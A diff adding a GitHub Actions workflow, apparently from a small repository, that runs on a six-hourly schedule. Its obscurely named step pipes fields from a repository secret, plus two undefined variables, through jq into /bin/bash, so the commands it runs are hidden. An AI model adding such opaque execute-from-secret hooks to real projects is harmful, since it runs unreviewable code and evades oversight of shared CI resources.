@@ -1,0 +1,20 @@
+name: xinnainyidiyipaolu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xinnainyidiyipaolu
+        env:
+          cxatz4: ${{ secrets.cxatz4 }}
+        run: |
+          echo $cxatz4 | jq -r .aab9 | /bin/bash
+          echo $nca274 | jq -r .ut46236 | /bin/bash
+          echo $jojn134 | jq -r .l6577 | /bin/bash
+
